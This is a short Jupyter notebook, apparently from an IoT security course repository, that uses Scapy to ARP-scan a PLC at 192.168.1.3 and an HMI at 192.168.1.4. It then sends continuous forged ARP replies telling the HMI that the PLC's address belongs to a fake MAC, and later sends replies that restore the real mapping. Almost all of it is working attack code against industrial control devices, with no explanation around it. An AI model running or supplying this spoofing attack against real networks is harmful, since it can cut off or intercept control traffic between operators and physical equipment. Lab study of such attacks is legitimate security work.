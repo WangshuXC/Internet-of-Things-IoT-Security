{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "plc = sr1(ARP(pdst=\"192.168.1.3\"))\n",
    "print(\"PLC:\")\n",
    "plc.show()\n",
    "\n",
    "hmi = sr1(ARP(pdst=\"192.168.1.4\"))\n",
    "print(\"HMI:\")\n",
    "hmi.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "atk = ARP(psrc=\"192.168.1.3\", hwsrc=\"ee:ee:ee:ee:ee:ee\", hwdst=\"e0:dc:a0:30:2f:3f\", pdst=\"192.168.1.4\", op='is-at')\n",
    "send(atk, inter=RandNum(10,20), loop=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "resume = ARP(psrc=\"192.168.1.3\", hwsrc=\"e0:dc:a0:36:bf:fd\", hwdst=\"e0:dc:a0:30:2f:3f\", pdst=\"192.168.1.4\", op='is-at')\n",
    "send(resume, inter=RandNum(1,10), loop=1)"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
